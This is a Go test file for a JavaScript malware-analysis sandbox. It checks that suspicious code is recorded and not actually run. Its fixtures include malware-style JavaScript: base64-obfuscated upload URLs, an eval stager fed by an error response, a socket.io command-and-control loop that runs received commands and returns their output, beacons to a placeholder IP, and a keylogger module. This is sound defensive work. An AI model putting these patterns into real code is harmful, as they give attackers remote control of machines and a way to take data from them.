package sandbox

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func run(t *testing.T, src string, opts Options) *Trace {
	t.Helper()
	tr, err := Run(src, opts)
	if err != nil {
		t.Fatal(err)
	}
	return tr
}

func TestExecIsRecordedNotRun(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "should-not-exist")
	tr := run(t, `
		const cp = require('child_process');
		cp.exec('touch `+marker+`', (e, out) => {});
		cp.execSync('whoami');
		require('node:child_process').spawn('sh', ['-c', 'id']);
	`, Options{Platform: "linux"})
	ex := tr.Of("exec")
	if len(ex) != 3 {
		t.Fatalf("got %d exec events, want 3: %+v", len(ex), ex)
	}
	if ex[0].Data["command"] != "touch "+marker || ex[2].Data["api"] != "spawn" {
		t.Errorf("unexpected exec events: %+v", ex)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("exec stub actually ran a command")
	}
}

func TestBufferAndBase64(t *testing.T) {
	tr := run(t, `
		const u = Buffer.from('aHR0cDovLzIwMy4wLjExMy40Nzox' + 'NDE4', 'base64').toString();
		const h = Buffer.from('2f75706c6f616473', 'hex').toString('utf8');
		require('axios').get(u + h);
		console.log(atob('aGk='), Buffer.from('é').length, Buffer.from('x').toString('base64'));
	`, Options{})
	reqs := tr.Of("http.request")
	if len(reqs) != 1 || reqs[0].Data["url"] != "http://203.0.113.47:1418/uploads" {
		t.Fatalf("decoded URL wrong: %+v", reqs)
	}
	logs := tr.Of("console")
	args, _ := logs[0].Data["args"].([]any)
	if len(args) != 3 || args[0] != "hi" || args[1] != float64(2) || args[2] != "eA==" {
		t.Errorf("console args = %v", args)
	}
}

func TestErrorHandlerStage(t *testing.T) {
	src := `
		const axios = require('axios');
		axios.get('http://stage.invalid/api/service/token/abc')
		  .then(() => {})
		  .catch(err => eval(err.response.data));
	`
	tr := run(t, src, Options{Response: Response{Status: 500, Body: "globalThis.reached = require('os').hostname(); console.log('stage2')"}})
	if len(tr.Stages) != 1 || tr.Stages[0].Via != "eval" {
		t.Fatalf("stage not captured: %+v", tr.Stages)
	}
	if !strings.Contains(tr.Stages[0].Code, "stage2") {
		t.Errorf("stage code = %q", tr.Stages[0].Code)
	}
	if len(tr.Of("console")) != 1 {
		t.Errorf("stage did not run inside the sandbox")
	}

	// With a 200 the catch never fires and nothing is staged.
	tr = run(t, src, Options{Response: Response{Status: 200, Body: "console.log('x')"}})
	if len(tr.Stages) != 0 {
		t.Errorf("staged on success path: %+v", tr.Stages)
	}
}

func TestFunctionAndCompileStages(t *testing.T) {
	tr := run(t, `
		new Function('return 1')();
		const m = new module.constructor();
		m._compile('module.exports = 42', 'mem.js');
	`, Options{})
	var vias []string
	for _, s := range tr.Stages {
		vias = append(vias, s.Via)
	}
	if strings.Join(vias, ",") != "Function,Module._compile" {
		t.Errorf("stages via %v", vias)
	}
}

func TestSocketDriveAndProbe(t *testing.T) {
	tr := run(t, `
		const io = require('socket.io-client');
		const s = io('http://203.0.113.47:1418');
		s.on('connect', () => s.emit('hello', {id: 1}));
		s.on('command', (m) => require('child_process').exec(m.message, (e, out) => s.emit('message', out)));
	`, Options{Probe: true})
	var emits []string
	for _, e := range tr.Of("socketio.emit") {
		emits = append(emits, e.Data["event"].(string))
	}
	if strings.Join(emits, ",") != "hello,message" {
		t.Errorf("emits = %v", emits)
	}
	ex := tr.Of("exec")
	if len(ex) != 1 || !strings.Contains(ex[0].Data["command"].(string), "crumble-probe") {
		t.Errorf("probe didn't reach exec: %+v", ex)
	}
}

func TestTimersAndIntervalsAreBounded(t *testing.T) {
	tr := run(t, `
		let n = 0;
		setInterval(() => { n++; require('axios').post('http://203.0.113.5/beacon', {n}); }, 60000);
		setTimeout(() => console.log('later'), 3600000);
	`, Options{})
	if got := len(tr.Of("http.request")); got != 4 {
		t.Errorf("interval fired %d times, want 4 (first + 3 repeats)", got)
	}
	if len(tr.Of("console")) != 1 {
		t.Errorf("long timeout never fired")
	}
}

func TestInfiniteLoopHitsBudget(t *testing.T) {
	start := time.Now()
	tr := run(t, `require('os'); while (true) {}`, Options{Budget: time.Second})
	if !tr.TimedOut {
		t.Error("TimedOut not set")
	}
	if time.Since(start) > 5*time.Second {
		t.Errorf("budget not enforced: %v", time.Since(start))
	}
	if len(tr.Of("require")) != 1 {
		t.Error("events before the loop were lost")
	}
}

func TestProcessExit(t *testing.T) {
	tr := run(t, `console.log(1); process.exit(0); console.log(2);`, Options{})
	if !tr.Exited || len(tr.Of("console")) != 1 {
		t.Errorf("exit not honoured: exited=%v events=%+v", tr.Exited, tr.Events)
	}
}

func TestRootConfinement(t *testing.T) {
	root := t.TempDir()
	os.WriteFile(filepath.Join(root, "payload.list"), []byte("console.log('second file')"), 0o644)
	os.MkdirAll(filepath.Join(root, "lib"), 0o755)
	os.WriteFile(filepath.Join(root, "lib", "cfg.json"), []byte(`{"c2":"203.0.113.8:1244"}`), 0o644)
	secret := filepath.Join(filepath.Dir(root), "outside.txt")
	os.WriteFile(secret, []byte("nope"), 0o644)
	defer os.Remove(secret)

	tr := run(t, `
		const fs = require('fs');
		eval(fs.readFileSync(__dirname + '/payload.list', 'utf8'));
		const cfg = require('./lib/cfg.json');
		require('axios').get('http://' + cfg.c2);
		try { fs.readFileSync(__dirname + '/../outside.txt', 'utf8'); console.log('escaped'); } catch (e) {}
		try { fs.readFileSync('/etc/hostname', 'utf8'); console.log('escaped'); } catch (e) {}
	`, Options{Platform: "linux", Root: root})

	var logs []string
	for _, e := range tr.Of("console") {
		logs = append(logs, e.Data["args"].([]any)[0].(string))
	}
	if strings.Join(logs, ",") != "second file" {
		t.Errorf("console = %v (root confinement or local read broken)", logs)
	}
	if r := tr.Of("http.request"); len(r) != 1 || r[0].Data["url"] != "http://203.0.113.8:1244" {
		t.Errorf("json require failed: %+v", r)
	}
}

func TestUnknownModuleIsGhost(t *testing.T) {
	tr := run(t, `
		const k = require('node-global-key-listener');
		const l = new k.GlobalKeyboardListener();
		l.addListener(() => {});
	`, Options{})
	if tr.Error != "" {
		t.Fatalf("ghost module threw: %s", tr.Error)
	}
	var targets []string
	for _, e := range tr.Of("call") {
		targets = append(targets, e.Data["target"].(string))
	}
	want := "new require('node-global-key-listener').GlobalKeyboardListener"
	if len(targets) == 0 || targets[0] != want {
		t.Errorf("calls = %v", targets)
	}
}
